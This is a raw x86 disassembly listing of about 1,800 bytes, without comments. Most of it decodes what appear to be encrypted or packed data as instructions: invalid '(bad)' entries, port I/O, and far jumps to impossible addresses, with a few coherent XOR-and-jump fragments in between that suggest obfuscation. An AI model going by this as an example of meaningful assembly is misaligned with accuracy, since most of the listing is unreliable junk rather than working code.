  407d25:	jp     0x407cd0
  407d27:	imul   esi,DWORD PTR [ebx-0x4f],0x7a
  407d2b:	outs   dx,DWORD PTR ds:[esi]
  407d2c:	push   ss
  407d2d:	imul   ebx,edx,0x972f9cf7
  407d33:	sbb    ecx,ebx
  407d35:	aad    0xff
  407d37:	xchg   esp,eax
  407d38:	mov    ds:0xacc272d1,al
  407d3d:	xchg   esp,eax
  407d3e:	cwde   
  407d3f:	push   edx
  407d40:	ficom  WORD PTR ds:0xe465184a
  407d46:	scas   al,BYTE PTR es:[edi]
  407d47:	popa   
  407d48:	mov    ?,WORD PTR [ebx+0x45def14c]
  407d4e:	xchg   edi,eax
  407d4f:	push   ebp
  407d50:	aam    0xf9
  407d52:	cmp    al,0xc4
  407d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d55:	dec    eax
  407d56:	jbe    0x407ced
  407d58:	out    dx,eax
  407d59:	xor    BYTE PTR [edx+edi*8-0x6b],ch
  407d5d:	push   cs
  407d5e:	adc    DWORD PTR [ebx-0xd37a7df],ebp
  407d64:	mov    es,WORD PTR [esi-0x39b74fa2]
  407d6a:	fcomp  DWORD PTR [ebp+0x13243046]
  407d70:	in     al,0x9b
  407d72:	ret    0xfe66
  407d75:	add    BYTE PTR [edx],dh
  407d77:	push   esi
  407d78:	sbb    cl,BYTE PTR [ebp-0xa]
  407d7b:	ror    BYTE PTR [eax],1
  407d7d:	mov    eax,0xb391d813
  407d83:	sub    ecx,esi
  407d85:	cwde   
  407d86:	mov    ebp,0x61e539d1
  407d8b:	shl    DWORD PTR [ebp+0x64093a89],cl
  407d91:	push   es
  407d92:	jbe    0x407dea
  407d94:	lea    esp,[edx-0xd6e9330]
  407d9a:	mov    eax,0x9b0091a7
  407d9f:	test   eax,0xa343c3cf
  407da4:	cmc    
  407da5:	or     dl,al
  407da7:	fs jmp 0xdd7d:0x599431cb
  407daf:	fadd   DWORD PTR [eax+ebp*2+0x60]
  407db3:	arpl   WORD PTR [esi-0x2e],bx
  407db6:	rcr    DWORD PTR [esi],1
  407db8:	outs   dx,DWORD PTR ds:[esi]
  407db9:	mov    cl,0x8e
  407dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dbc:	mov    edx,0x9391bbf
  407dc1:	mov    al,0xa1
  407dc3:	mov    DWORD PTR [eax],eax
  407dc5:	sub    eax,0x4beab671
  407dca:	mov    esp,ss
  407dcc:	fwait
  407dcd:	popf   
  407dce:	mov    al,ds:0x3465873e
  407dd3:	inc    eax
  407dd4:	fs or  eax,0xbfa98baf
  407dda:	loop   0x407db6
  407ddc:	mov    ecx,?
  407dde:	rcl    DWORD PTR [ecx+0x6c88c0ec],1
  407de4:	pop    eax
  407de5:	and    BYTE PTR [ecx-0x19],ah
  407de8:	(bad)  
  407de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dea:	in     eax,dx
  407deb:	mov    ebp,edx
  407ded:	jp     0x407e66
  407def:	dec    ebp
  407df0:	inc    esp
  407df1:	or     ch,cl
  407df3:	call   0x976:0x324c6e84
  407dfa:	imul   esi,ecx,0x25
  407dfd:	pop    edi
  407dfe:	pop    ecx
  407dff:	and    BYTE PTR [edi+ecx*8-0x5896d053],ch
  407e06:	outs   dx,DWORD PTR ds:[esi]
  407e07:	push   cs
  407e08:	mov    ah,0x51
  407e0a:	test   eax,0xcacc779e
  407e0f:	ficom  WORD PTR [ebp-0x34]
  407e12:	sti    
  407e13:	mov    esp,0xa0757466
  407e18:	push   cs
  407e19:	fstp   DWORD PTR ds:0x6fe5d97f
  407e1f:	mov    bl,0x51
  407e21:	js     0x407dd9
  407e23:	sub    al,0x68
  407e25:	dec    ebx
  407e26:	push   ds
  407e27:	in     al,dx
  407e28:	inc    ebp
  407e29:	pop    es
  407e2a:	sub    BYTE PTR [ebp-0x7cffa8c2],ch
  407e30:	cmp    al,0xfb
  407e32:	pusha  
  407e33:	xchg   edi,eax
  407e34:	in     al,dx
  407e35:	addr16 fsubrp st(1),st
  407e38:	inc    esp
  407e39:	inc    edi
  407e3a:	iret   
  407e3b:	sub    eax,0xd14c3fce
  407e40:	repnz lods al,BYTE PTR ds:[esi]
  407e42:	fs sbb cl,ah
  407e45:	push   0x21105e8f
  407e4a:	rcl    DWORD PTR [esi+0x6d],1
  407e4d:	stos   BYTE PTR es:[edi],al
  407e4e:	(bad)  
  407e4f:	cdq    
  407e50:	sbb    al,BYTE PTR [ebx+ebx*2-0x61f99b30]
  407e57:	sti    
  407e58:	mov    ah,0x98
  407e5a:	ficomp WORD PTR [edx-0x322def3a]
  407e60:	stc    
  407e61:	inc    esp
  407e62:	lahf   
  407e63:	mov    ah,dl
  407e65:	xchg   esp,eax
  407e66:	mov    cl,0x41
  407e68:	jl     0x407eba
  407e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e6b:	pop    es
  407e6c:	mov    edx,0x51dfa64d
  407e71:	mov    edi,0x870fc60b
  407e76:	or     BYTE PTR [eax],al
  407e78:	add    BYTE PTR [eax],al
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	iret   
  407e9e:	mov    esp,0xcd110813
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407f15
  407eaa:	mov    BYTE PTR [ebp+0x61],cl
  407ead:	push   esp
  407eae:	xchg   edi,eax
  407eaf:	js     0x407e34
  407eb1:	fld    TBYTE PTR [ebx+0xd]
  407eb4:	adc    dl,BYTE PTR [edi-0x77]
  407eb7:	ins    BYTE PTR es:[edi],dx
  407eb8:	out    dx,eax
  407eb9:	sahf   
  407eba:	(bad)  
  407ebb:	out    dx,al
  407ebc:	out    dx,al
  407ebd:	in     eax,dx
  407ebe:	ins    BYTE PTR es:[edi],dx
  407ebf:	addr16 inc edi
  407ec1:	or     BYTE PTR [edx-0x77ed58ed],0xe9
  407ec8:	retf   0x20c8
  407ecb:	xchg   esp,eax
  407ecc:	fwait
  407ecd:	adc    eax,0xa85e7da3
  407ed2:	stc    
  407ed3:	lods   eax,DWORD PTR ds:[esi]
  407ed4:	or     ch,BYTE PTR [ebx]
  407ed6:	mov    ds:0x266e0f9f,eax
  407edb:	lock int3 
  407edd:	mov    ch,0xe1
  407edf:	not    ah
  407ee1:	lods   eax,DWORD PTR ds:[esi]
  407ee2:	gs out 0xe4,al
  407ee5:	out    dx,eax
  407ee6:	add    eax,0x123e5a84
  407eeb:	mov    edi,0xc064033f
  407ef0:	mov    bh,BYTE PTR [ebx+esi*2-0x62]
  407ef4:	mov    ebx,0x384ca8f7
  407ef9:	test   esp,eax
  407efb:	jecxz  0x407f22
  407efd:	jno    0x407f2c
  407eff:	in     eax,0xc7
  407f01:	(bad)  
  407f02:	arpl   WORD PTR [edx-0x5585f083],cx
  407f08:	or     DWORD PTR [ecx+eiz*4-0x2aad4df2],ebx
  407f0f:	cmc    
  407f10:	mov    ds:0x20613852,eax
  407f15:	test   DWORD PTR [ebp+0x38b62063],ecx
  407f1b:	jns    0x407f59
  407f1d:	aas    
  407f1e:	push   ss
  407f1f:	mov    ebp,0x562198ae
  407f24:	add    al,0xd6
  407f26:	inc    bp
  407f28:	push   edi
  407f29:	or     BYTE PTR [ebp-0x1e],0xa5
  407f2d:	stc    
  407f2e:	mov    esp,0x3e33fd3c
  407f33:	(bad)  
  407f34:	pop    esi
  407f35:	sbb    dh,BYTE PTR [eax+0x237bb1fb]
  407f3b:	in     al,0x88
  407f3d:	push   ebp
  407f3e:	mov    ah,0xb7
  407f40:	mov    ch,0xce
  407f42:	scas   eax,DWORD PTR es:[edi]
  407f43:	adc    DWORD PTR [ebx+0x582df2b],esi
  407f49:	pop    ds
  407f4a:	sub    BYTE PTR [edi],ch
  407f4c:	sub    BYTE PTR [eax+edx*4+0x3c],ah
  407f50:	xor    edi,eax
  407f52:	jmp    0xe4def45d
  407f57:	pop    edi
  407f58:	(bad)  
  407f5a:	retf   
  407f5b:	call   0x7ccb:0xfb602212
  407f62:	push   esi
  407f63:	shl    BYTE PTR [eax+0x15],1
  407f66:	(bad)  
  407f67:	dec    ecx
  407f68:	mov    edi,0x9b640976
  407f6d:	cwde   
  407f6e:	mov    bl,0x16
  407f70:	jp     0x407f32
  407f72:	int3   
  407f73:	retf   
  407f74:	pop    esp
  407f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f76:	and    eax,0xb468606f
  407f7b:	punpckhdq mm7,QWORD PTR [eax+0x7787beef]
  407f82:	(bad)  
  407f84:	xchg   DWORD PTR [eax+ecx*4],esp
  407f87:	xor    al,0x5b
  407f89:	jb     0x407f14
  407f8b:	xchg   esp,eax
  407f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f8d:	inc    ebp
  407f8e:	mov    ch,0xef
  407f90:	das    
  407f91:	mov    bh,0x9a
  407f93:	fisttp QWORD PTR [eax-0x3831daf3]
  407f99:	push   ebx
  407f9a:	stc    
  407f9b:	mov    esi,0x796ccbb0
  407fa0:	imul   ecx,DWORD PTR [esi],0x23
  407fa3:	add    BYTE PTR [esi-0x53],bh
  407fa6:	xchg   edx,eax
  407fa7:	shl    BYTE PTR [eax-0x32],1
  407faa:	or     DWORD PTR [esi+0x6],ebp
  407fad:	cmp    al,0x65
  407faf:	pop    ss
  407fb0:	sub    ecx,esp
  407fb2:	arpl   dx,di
  407fb4:	cs sahf 
  407fb6:	mov    esp,0x10e2bb0a
  407fbb:	xchg   esp,eax
  407fbc:	sbb    BYTE PTR [edx+0x77712326],ch
  407fc2:	add    DWORD PTR [ebp-0x22057cd4],ebp
  407fc8:	ror    BYTE PTR [edi+0x2f],1
  407fcb:	inc    eax
  407fcc:	jbe    0x407f80
  407fce:	mov    ah,0x5e
  407fd0:	test   BYTE PTR [ebx+0x6878ad82],0x8c
  407fd7:	loope  0x407feb
  407fd9:	mov    bl,0x2f
  407fdb:	push   ss
  407fdc:	pop    eax
  407fdd:	pop    esp
  407fde:	mov    ecx,0xc9221816
  407fe3:	push   edx
  407fe4:	fst    DWORD PTR [ecx]
  407fe6:	int    0x59
  407fe8:	(bad)  
  407fe9:	xor    edi,DWORD PTR [ebx+ebp*8]
  407fec:	loop   0x408013
  407fee:	scas   al,BYTE PTR es:[edi]
  407fef:	cdq    
  407ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff1:	sub    bl,BYTE PTR [ecx+0x42]
  407ff4:	popa   
  407ff5:	les    ebp,FWORD PTR [ebp+0x12777acf]
  407ffb:	daa    
  407ffc:	sub    al,0x29
  407ffe:	hlt    
  407fff:	push   esp
  408000:	mov    ebp,0x27ea74bc
  408005:	pop    esp
  408006:	sti    
  408007:	add    DWORD PTR fs:[ebx+0x2b16ef43],0xee2abe72
  408012:	xchg   DWORD PTR [ecx+0x5c],ebp
  408015:	lock neg BYTE PTR [ebp-0x431e8ef3]
  40801c:	xchg   ebp,eax
  40801d:	retf   
  40801e:	fist   WORD PTR [edx-0x4b938ec2]
  408024:	neg    DWORD PTR [edi]
  408026:	jb     0x40802d
  408028:	fstp   QWORD PTR ss:[eax]
  40802b:	fimul  DWORD PTR [esi-0x45fe2496]
  408031:	(bad)  [esi+0x352f5d74]
  408037:	mov    eax,0xa6b07b72
  40803c:	xlat   BYTE PTR ds:[ebx]
  40803d:	add    edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	fild   WORD PTR [ecx-0x3552c5ce]
  40807f:	jle    0x4080ff
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x40801d
  408086:	mov    ch,0x7d
  408088:	test   al,0x9e
  40808a:	mov    esp,0xf7bfe538
  40808f:	ret    0xc893
  408092:	stc    
  408093:	pusha  
  408094:	push   esp
  408095:	es cli 
  408097:	pushf  
  408098:	dec    ebx
  408099:	call   eax
  40809b:	(bad)  
  40809c:	mov    ebp,0x5a376ad
  4080a1:	inc    DWORD PTR [ecx]
  4080a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a4:	mov    DWORD PTR [ebx+0x379d01c],eax
  4080aa:	jg     0x40804c
  4080ac:	jge    0x40808b
  4080ae:	pusha  
  4080af:	pop    esi
  4080b0:	xlat   BYTE PTR ds:[ebx]
  4080b1:	arpl   WORD PTR [edx],ax
  4080b3:	int3   
  4080b4:	pop    esi
  4080b5:	test   DWORD PTR [edx-0x76ee8247],0x8fd1864f
  4080bf:	push   0xffffff80
  4080c1:	jle    0x408076
  4080c3:	loope  0x408140
  4080c5:	inc    esi
  4080c6:	(bad)  
  4080c7:	scas   al,BYTE PTR es:[edi]
  4080c8:	inc    edx
  4080c9:	cmp    BYTE PTR [ebx],al
  4080cb:	lahf   
  4080cc:	add    edi,DWORD PTR [eax-0x27]
  4080cf:	xchg   ebp,eax
  4080d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d1:	sahf   
  4080d2:	repz leave 
  4080d4:	adc    DWORD PTR [esi+0x7e40ef2c],esp
  4080da:	cld    
  4080db:	(bad)  
  4080dc:	jmp    0x4080e6
  4080de:	xchg   esi,eax
  4080df:	inc    ebp
  4080e0:	jl     0x4080f8
  4080e2:	sbb    ecx,edx
  4080e4:	ror    eax,1
  4080e6:	ins    DWORD PTR es:[edi],dx
  4080e7:	xor    al,0xf5
  4080e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ea:	and    DWORD PTR [edi+ecx*2],ebx
  4080ed:	aam    0x7c
  4080ef:	les    eax,FWORD PTR [ebx]
  4080f1:	stos   DWORD PTR es:[edi],eax
  4080f2:	lock fsub QWORD PTR [esi+0x45f3ca8]
  4080f9:	stos   DWORD PTR es:[edi],eax
  4080fa:	jb     0x4080fc
  4080fc:	(bad)  
  4080fe:	adc    DWORD PTR [esi-0x38],ebx
  408101:	dec    esp
  408102:	das    
  408103:	dec    esp
  408104:	sbb    DWORD PTR [edx],esp
  408106:	hlt    
  408107:	and    eax,0xc88ff768
  40810c:	test   BYTE PTR [edx+0x546a2caf],0x4b
  408113:	(bad)  
  408114:	ficomp WORD PTR [edi-0x1a05e498]
  40811a:	lods   eax,DWORD PTR ds:[esi]
  40811b:	fsub   DWORD PTR [esi+0x67]
  40811e:	daa    
  40811f:	xchg   ebp,eax
  408120:	jge    0x408177
  408122:	dec    esp
  408123:	jmp    0xbe023f66
  408128:	xchg   ebx,eax
  408129:	cli    
  40812a:	fabs   
  40812c:	(bad)
  40812f:	out    0xea,eax
  408131:	fdiv   QWORD PTR [esi-0x80]
  408134:	dec    ebp
  408135:	loope  0x4081a3
  408137:	das    
  408138:	fs push ebp
  40813a:	adc    eax,edx
  40813c:	cmp    edx,ebp
  40813e:	dec    ebx
  40813f:	mul    DWORD PTR [eax]
  408141:	dec    edi
  408142:	test   eax,0xdd237074
  408147:	into   
  408148:	inc    ebp
  408149:	loope  0x4081a1
  40814b:	mov    ebp,0xeef496f0
  408150:	stos   BYTE PTR es:[edi],al
  408151:	dec    esi
  408152:	jl     0x408126
  408154:	ror    dh,cl
  408156:	sub    DWORD PTR ds:0x606397fb,ebx
  40815c:	mov    eax,ds:0x596185c3
  408161:	jno    0x4081be
  408163:	ss (bad) 
  408165:	xor    dh,BYTE PTR fs:[ebp+0x57]
  408169:	inc    ecx
  40816a:	call   0xde60cf0e
  40816f:	or     BYTE PTR [ebx+0x17bd22e4],bh
  408175:	jge    0x408102
  408177:	jge    0x408126
  408179:	lock test al,0x22
  40817c:	sub    al,0x9e
  40817e:	ds int3 
  408180:	fnsave [eax+0x34edd2a5]
  408186:	shl    DWORD PTR [eax],cl
  408188:	test   al,0x2b
  40818a:	repz adc eax,0x351b7a8d
  408190:	dec    ch
  408192:	loop   0x40818a
  408194:	sti    
  408195:	or     DWORD PTR [edx-0x24949581],esi
  40819b:	jno    0x408196
  40819d:	dec    esp
  40819e:	inc    edx
  40819f:	xchg   edx,eax
  4081a0:	aam    0xe3
  4081a2:	jle    0x40815d
  4081a4:	aad    0x74
  4081a6:	sub    eax,0x7a19e0fd
  4081ab:	into   
  4081ac:	sub    cl,al
  4081ae:	dec    ecx
  4081af:	ror    BYTE PTR [esi+0x1fb77753],1
  4081b5:	xchg   esp,eax
  4081b6:	mov    bl,0x7d
  4081b8:	and    DWORD PTR [edi+0x76e338c2],0x1b7fd949
  4081c2:	jae    0x4081f3
  4081c4:	pop    ebp
  4081c5:	mov    bh,0x1e
  4081c7:	mov    ?,WORD PTR [eax+0x72]
  4081ca:	ror    BYTE PTR [ebx+0x56],1
  4081cd:	mov    BYTE PTR [edx+0x19916136],al
  4081d3:	(bad)  
  4081d4:	in     al,dx
  4081d5:	dec    DWORD PTR [ecx-0x35]
  4081d8:	pop    ds
  4081d9:	popf   
  4081da:	mov    bh,BYTE PTR ds:0xa8c78c73
  4081e0:	push   eax
  4081e1:	inc    ebx
  4081e2:	dec    ebx
  4081e3:	xor    al,0x20
  4081e5:	add    ebp,ecx
  4081e7:	adc    DWORD PTR [edx-0x77d6addb],esi
  4081ed:	or     ch,0xa
  4081f0:	out    0x15,eax
  4081f2:	inc    eax
  4081f3:	stos   DWORD PTR es:[edi],eax
  4081f4:	in     al,dx
  4081f5:	clc    
  4081f6:	je     0x408199
  4081f8:	hlt    
  4081f9:	(bad)  
  4081fa:	and    al,bh
  4081fc:	outs   dx,DWORD PTR ds:[esi]
  4081fd:	rcr    BYTE PTR [ebp+0x2],cl
  408200:	sub    ebp,edx
  408202:	mov    al,bl
  408204:	out    0xee,al
  408206:	cwde   
  408207:	push   esi
  408208:	inc    esi
  408209:	in     eax,dx
  40820a:	ret    0xcd88
  40820d:	dec    ebp
  40820e:	dec    ebx
  40820f:	mov    ebx,0x6e45abb2
  408214:	test   esp,ebp
  408216:	mov    edx,0xd103e08e
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x39c9:0x90b5ea62
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408258
  408239:	sahf   
  40823a:	add    al,0xd
  40823c:	imul   esp,DWORD PTR [edi+0xa993145],0xffffff9e
  408243:	pop    edx
  408244:	lods   eax,DWORD PTR ds:[esi]
  408245:	and    edi,DWORD PTR [ecx]
  408247:	dec    ecx
  408248:	popa   
  408249:	ret    
  40824a:	enter  0xdb75,0x2f
  40824e:	mov    esp,0x97f58b64
  408253:	addr16 jnp 0x408205
  408256:	inc    ecx
  408257:	call   0x145ec671
  40825c:	push   ds
  40825d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40825e:	or     cl,al
  408260:	push   esp
  408261:	int3   
  408262:	push   0x6f
  408264:	in     al,0x30
  408266:	daa    
  408267:	leave  
  408268:	pop    ebp
  408269:	clc    
  40826a:	xchg   ebx,eax
  40826b:	mov    esp,0xeea2ebbc
  408270:	out    0x6c,eax
  408272:	inc    BYTE PTR [esi+0x58]
  408275:	cmp    BYTE PTR [eax*2-0x36757b4f],bl
  40827c:	cmp    cl,cl
  40827e:	ins    BYTE PTR es:[edi],dx
  40827f:	sar    DWORD PTR [edx+0x2d],1
  408282:	adc    DWORD PTR ds:0x6f7fca3f,edx
  408288:	int3   
  408289:	(bad)  
  40828b:	mov    ds:0xdb91c009,al
  408290:	jl     0x4082bf
  408292:	in     al,0x24
  408294:	neg    BYTE PTR [ebx]
  408296:	xchg   esp,eax
  408297:	mov    edx,0xa825d316
  40829c:	xor    eax,0xab35d2dd
  4082a1:	sahf   
  4082a2:	mov    edi,0x5ef2d256
  4082a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a8:	cmp    DWORD PTR [edi+ecx*2+0x6a],0xffffff8d
  4082ad:	sub    al,0x92
  4082af:	pusha  
  4082b0:	inc    edx
  4082b1:	pop    edx
  4082b2:	bound  edx,QWORD PTR [edx-0x6c818037]
  4082b8:	add    al,0x7a
  4082ba:	cmp    al,0x8c
  4082bc:	xchg   ebp,eax
  4082bd:	jmp    0x4082c0
  4082bf:	int3   
  4082c0:	rcr    ebx,cl
  4082c2:	fbld   TBYTE PTR [ebp+0x43286726]
  4082c8:	iret   
  4082c9:	popa   
  4082ca:	aaa    
  4082cb:	sbb    DWORD PTR [esi],0xffffff9d
  4082ce:	mov    DWORD PTR [eax],ebx
  4082d0:	call   0x3fb9:0x44a52c37
  4082d7:	ins    BYTE PTR es:[edi],dx
  4082d8:	mov    bh,0xb0
  4082da:	cmp    al,0x91
  4082dc:	stos   DWORD PTR es:[edi],eax
  4082dd:	lahf   
  4082de:	inc    edi
  4082df:	fwait
  4082e0:	xchg   ebp,eax
  4082e1:	inc    eax
  4082e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e3:	push   ebp
  4082e4:	fst    DWORD PTR [eax+0x2b]
  4082e7:	xor    eax,0x31f45301
  4082ec:	shr    BYTE PTR [edi],cl
  4082ee:	daa    
  4082ef:	sub    DWORD PTR [edi-0x71c4b229],eax
  4082f5:	sub    eax,0x5196e5e3
  4082fa:	das    
  4082fb:	xchg   esp,eax
  4082fc:	lahf   
  4082fd:	dec    ecx
  4082fe:	push   edx
  4082ff:	in     eax,0x86
  408301:	cmp    esi,DWORD PTR [esi+0x63]
  408304:	loop   0x40832b
  408306:	stos   BYTE PTR es:[edi],al
  408307:	mov    esp,0x1bf792e8
  40830c:	sbb    bh,al
  40830e:	icebp  
  40830f:	test   esp,0x57273020
  408315:	cmp    eax,0x503c02be
  40831a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831b:	dec    eax
  40831c:	hlt    
  40831d:	push   ss
  40831e:	ret    0xdadc
  408321:	adc    DWORD PTR [eax-0x3d15ea76],edi
  408327:	mov    cs,WORD PTR ds:0x3ce8764a
  40832d:	(bad)  
  40832e:	dec    ecx
  40832f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408330:	adc    dh,BYTE PTR [esi-0x7584e830]
  408336:	les    esi,FWORD PTR [eax-0x7]
  408339:	jne    0x408330
  40833b:	sti    
  40833c:	jmp    0x3a7a:0x2f3486a5
  408343:	xor    cl,dh
  408345:	jle    0x408321
  408347:	cld    
  408348:	xchg   ebp,eax
  408349:	dec    edx
  40834a:	call   0x4bd2d446
  40834f:	cmp    bl,bl
  408351:	sahf   
  408352:	adc    al,0x64
  408354:	ds jge 0x408323
  408357:	inc    ecx
  408358:	int    0xd4
  40835a:	dec    ebp
  40835b:	sti    
  40835c:	mov    al,0x74
  40835e:	xor    al,0x83
  408360:	rol    ecx,cl
  408362:	aas    
  408363:	fndisi(8087 only) 
  408365:	daa    
  408366:	and    BYTE PTR [edx+0x27],dh
  408369:	out    dx,al
  40836a:	into   
  40836b:	adc    dl,BYTE PTR [edx+0xe]
  40836e:	dec    BYTE PTR [edi]
  408370:	test   eax,0x8d16c68b
  408375:	lock icebp 
  408377:	scas   al,BYTE PTR es:[edi]
  408378:	or     dh,cl
  40837a:	cmc    
  40837b:	fnstcw WORD PTR [ecx]
  40837d:	(bad)  
  40837f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408380:	sti    
  408381:	sub    eax,0x2998e143
  408386:	stos   DWORD PTR es:[edi],eax
  408387:	push   ds
  408388:	mov    ah,BYTE PTR [edi-0x42]
  40838b:	or     DWORD PTR [eax],esp
  40838d:	xor    BYTE PTR [ecx],dh
  40838f:	adc    al,0xe0
  408391:	jle    0x408383
  408393:	imul   edi,DWORD PTR [edx],0xb00d55c7
  408399:	or     ah,cl
  40839b:	fisttp WORD PTR ds:0xad6aae91
  4083a1:	pop    ebp
  4083a2:	xchg   BYTE PTR [esi+0x53],bl
  4083a5:	call   0xc8a4d2e7
  4083aa:	adc    DWORD PTR [esi+0x4e],esi
  4083ad:	(bad)  
  4083ae:	cwde   
  4083af:	hlt    
  4083b0:	adc    al,0x1
  4083b2:	les    eax,FWORD PTR [eax]
  4083b4:	or     BYTE PTR [ebp+0x29],cl
  4083b7:	stc    
  4083b8:	inc    ebp
  4083b9:	call   0xa745c6a4
  4083be:	pop    esp
  4083bf:	adc    ebx,eax
  4083c1:	cmp    ax,0x60cf
  4083c5:	pop    ecx
  4083c6:	mov    esi,0x57c314b6
  4083cb:	push   cs
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	jmp    0x7ec9:0x55da94a7
  4083ef:	jle    0x40837b
  4083f1:	jg     0x408471
  4083f3:	jle    0x4083e1
  4083f5:	adc    ebp,DWORD PTR [ebx-0x397ddec6]
  4083fb:	adc    BYTE PTR [esi],bl
  4083fd:	pop    eax
  4083fe:	imul   ebx,DWORD PTR [ebx],0x1cb811dd
  408404:	xchg   esi,esp
  408406:	aad    0xde
  408408:	cmc    
  408409:	(bad)
  40840d:	cmp    al,0x58
  40840f:	sub    al,0x46
  408411:	into   
  408412:	mov    ebp,0x1aa37ce4
  408417:	out    0x4b,al
  408419:	aam    0xe8
  40841b:	out    0x22,eax
  40841d:	jns    0x4083dd
  40841f:	sbb    DWORD PTR [ebp-0x7b65d839],0x75d60750
  408429:	adc    eax,0x7f396102
  40842e:	jp     0x4084af
  408430:	pop    ebp
  408431:	jo     0x408470
  408433:	jae    0x408452
  408435:	jo     0x4083bb
  408437:	shl    BYTE PTR [ecx],1
  408439:	add    eax,0x1333e469
  40843e:	xor    BYTE PTR [ecx+0x64],ch
  408441:	rcl    eax,0x11
  408444:	ret    0x8f2b
  408447:	and    bh,ah
  408449:	sbb    eax,0x8134908e
  40844e:	lock das 
  408450:	sub    dh,al
  408452:	test   eax,0x3a0f3853
  408457:	sbb    dh,BYTE PTR [edx]
  408459:	out    dx,eax
  40845a:	xor    al,0x5
  40845c:	mov    bh,0x33
  40845e:	pusha  
  40845f:	cmp    BYTE PTR [ecx-0xa],bl
  408462:	cmc    
  408463:	pop    ds
  408464:	xlat   BYTE PTR ds:[ebx]
  408465:	pop    ebp
  408466:	lods   al,BYTE PTR ds:[esi]
  408467:	xchg   ebx,eax
  408468:	mov    eax,ds:0x8deed3ea
  40846d:	enter  0x1653,0x77
  408471:	aad    0x2c
  408473:	push   ss
  408474:	xor    DWORD PTR [eax],edi
  408476:	sub    BYTE PTR [edi-0x569579bd],dh
  40847c:	sub    eax,DWORD PTR [esi-0x46]
  40847f:	rcl    cl,1
  408481:	ins    DWORD PTR es:[edi],dx
  408482:	int3   
  408483:	imul   ebx,DWORD PTR [esi+0x72],0x10
  408487:	xor    BYTE PTR [ecx+eiz*4],ah
  40848a:	ror    DWORD PTR [esi],cl
  40848c:	or     dl,BYTE PTR [eax+0x9cf18a]
  408492:	cmp    ebx,DWORD PTR [ecx-0x55f2dca2]
  408498:	test   al,0xcd
  40849a:	test   eax,0x9c43083f
  40849f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a0:	sub    ch,0x94
  4084a3:	inc    eax
  4084a4:	xchg   ebp,eax
  4084a5:	or     BYTE PTR [esi],0x18
  4084a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084a9:	pop    ebx
  4084aa:	cmc    
  4084ab:	cdq    
  4084ac:	mov    bh,0x33
  4084ae:	imul   ebx,DWORD PTR [esi],0xffffffab
  4084b1:	and    BYTE PTR [esp+ecx*2-0x10ee3a2b],al
  4084b8:	xchg   edi,eax
  4084b9:	shr    BYTE PTR [eax+0xf90ab48],0xc7
  4084c0:	xchg   edi,eax
  4084c1:	repnz and DWORD PTR [edi],esp
  4084c4:	mov    ebp,0x3aa345fc
  4084c9:	mov    eax,DWORD PTR [ebp+edx*4-0x32]
  4084cd:	cmp    ah,BYTE PTR [ecx-0x4cc2add7]
  4084d3:	and    cl,BYTE PTR [eax+ecx*8-0x71]
  4084d7:	xor    BYTE PTR ds:[edi+0x7],ch
  4084db:	xchg   edx,eax
  4084dc:	xchg   BYTE PTR [ebx+edi*1-0x79f3201c],ah
  4084e3:	inc    eax
  4084e4:	cmp    dh,dh
  4084e6:	cmp    eax,0x5727c9f3
  4084eb:	stos   BYTE PTR es:[edi],al
  4084ec:	push   esp
  4084ed:	mov    bh,0x8a
  4084ef:	inc    ebx
  4084f0:	dec    esp
  4084f1:	pop    ebx
  4084f2:	jmp    0x7850f88a
  4084f7:	fld    DWORD PTR [esi]
  4084f9:	sub    ah,0xdf
